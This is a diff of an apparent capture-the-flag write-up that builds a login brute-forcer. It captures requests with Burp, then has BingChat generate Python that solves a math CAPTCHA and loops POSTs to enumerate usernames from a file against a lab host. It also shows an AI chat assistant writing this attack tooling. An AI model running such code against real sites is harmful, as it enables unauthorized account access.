@@ -37,6 +37,7 @@ Make sure that you try to login with a correct CHAPTA, so we can intercept all k
 
 ## Request Bodies
 In Burp under Target/Site Map and the URL for the /login page, you should now see at least two kinds of POST-requests from the login form
+
 ![image](https://user-images.githubusercontent.com/6702854/236622180-2847a268-c159-42f8-afb5-283860065ecd.png)
 
 Clicking on those requests we get the full POST header:
@@ -53,4 +54,87 @@ POST /login HTTP/1.1
 username=user1&password=pwd&captcha=656
 ```
 
+These are very useful in our next step!
+
 # Creating our own brute force tool
+It seems that the easiest way is to create our own brute force tool to solve this challenge. The approach is to use Python and use [BingChat](https://www.bing.com/search?q=Bing+AI&showconv=1&FORM=hpcodx) to help us speed up the coding of this application. 
+
+> BingChat only requires a Microsoft-account, such as hotmail.com or outlook.com.
+
+> Please not that the response from the BingChat AI will probably differ with the same prompt used again
+
+``prompt > Write a Python function that takes a web response text and searches for a captcha in the following format "671 * 50 = ?", and calculates and returns the result. The operator can be all of the four basic operators.``
+
+```
+import re
+
+def solve_captcha(response_text: str) -> int:
+    match = re.search(r'(\d+)\s*([\+\-\*\/])\s*(\d+)\s*=\s*\?', response_text)
+    if match:
+        a = int(match.group(1))
+        operator = match.group(2)
+        b = int(match.group(3))
+        if operator == '+':
+            return a + b
+        elif operator == '-':
+            return a - b
+        elif operator == '*':
+            return a * b
+        elif operator == '/':
+            return a / b
+    return None
+```
+
+Great! We have a method that can parse and calculate the mathematical Captcha.
+
+
+Use the function above in a program that connects to http://victimip/login and POSTs username and password in this format "username=user1&password=pwd" until the response does not contain "does not exist". If the response contains "Invalid captcha" read the captcha from the response, calculate the value and POST again with format "username=user1&password=pwd&captcha=theCaptcha"
+
+import requests
+
+url = 'http://serverip/login'
+username = 'user1'
+password = 'pwd'
+
+while True:
+    data = {'username': username, 'password': password}
+    response = requests.post(url, data=data)
+    response_text = response.text
+    if 'does not exist' not in response_text:
+        break
+    if 'Invalid captcha' in response_text:
+        captcha_value = solve_captcha(response_text)
+        data['captcha'] = captcha_value
+        response = requests.post(url, data=data)
+        response_text = response.text
+        if 'does not exist' not in response_text:
+            break
+            
+            
+prompt > read username from a file called usernames.txt and use these in the loop to test usernames
+
+import requests
+
+url = 'http://serverip/login'
+password = 'pwd'
+
+with open('usernames.txt', 'r') as f:
+    usernames = f.read().splitlines()
+
+for username in usernames:
+    data = {'username': username, 'password': password}
+    response = requests.post(url, data=data)
+    response_text = response.text
+    if 'does not exist' not in response_text:
+        print(f'Successful login with username: {username}')
+        break
+    if 'Invalid captcha' in response_text:
+        captcha_value = solve_captcha(response_text)
+        data['captcha'] = captcha_value
+        response = requests.post(url, data=data)
+        response_text = response.text
+        if 'does not exist' not in response_text:
+            print(f'Successful login with username: {username}')
+            break
+
+
